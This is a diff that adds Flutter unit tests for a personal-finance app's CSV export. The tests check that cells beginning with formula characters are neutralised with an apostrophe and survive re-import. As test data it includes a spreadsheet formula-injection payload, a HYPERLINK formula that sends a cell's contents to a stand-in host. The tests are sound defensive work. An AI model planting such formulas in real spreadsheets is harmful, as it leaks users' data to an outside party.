@@ -1,5 +1,6 @@
 import 'package:csv/csv.dart';
 import 'package:flutter_test/flutter_test.dart';
+import 'package:monekin/app/settings/pages/backup/import_csv.page.dart';
 import 'package:monekin/core/database/app_db.dart';
 import 'package:monekin/core/database/backup/backup_database_service.dart';
 import 'package:monekin/core/models/account/account.dart';
@@ -102,5 +103,57 @@ void main() {
 
     expect(rows, hasLength(2));
     expect(rows[1].sublist(5), ['Bank', 'EUR', 'Food', 'Restaurants', '']);
+  });
+
+  test('prefixes text cells that spreadsheets would read as formulas', () {
+    final injected = MoneyTransaction(
+      id: 'injected',
+      date: DateTime(2026, 5, 15),
+      value: -45900,
+      isHidden: false,
+      type: TransactionType.expense,
+      account: _account('@Bank', 'EUR'),
+      accountCurrency: _eur,
+      title: '=HYPERLINK("https://example.invalid/?d="&F2,"x")',
+      notes: '+1 555 0100',
+      currentValueInPreferredCurrency: -45900,
+      tags: const [],
+    );
+
+    final rows = _export([injected]);
+
+    expect(rows[1].sublist(1, 2), ['-45900.00']);
+    expect(rows[1][3], '\'=HYPERLINK("https://example.invalid/?d="&F2,"x")');
+    expect(rows[1][4], "'+1 555 0100");
+    expect(rows[1][5], "'@Bank");
+  });
+
+  test('a text cell survives an export and a re-import', () async {
+    final titles = [
+      '-Almuerzo',
+      '=HYPERLINK("https://example.invalid/?d="&F2,"x")',
+      "'Almuerzo",
+    ];
+
+    for (final title in titles) {
+      final transaction = MoneyTransaction(
+        id: 'round-trip',
+        date: DateTime(2026, 5, 15),
+        value: -12000,
+        isHidden: false,
+        type: TransactionType.expense,
+        account: _account('Bank', 'EUR'),
+        accountCurrency: _eur,
+        title: title,
+        currentValueInPreferredCurrency: -12000,
+        tags: const [],
+      );
+
+      final parsed = await BackupDatabaseService().processCsv(
+        BackupDatabaseService().createCsvFromTransactions([transaction]),
+      );
+
+      expect(csvTextCell(parsed[1][3]), title);
+    }
   });
 }
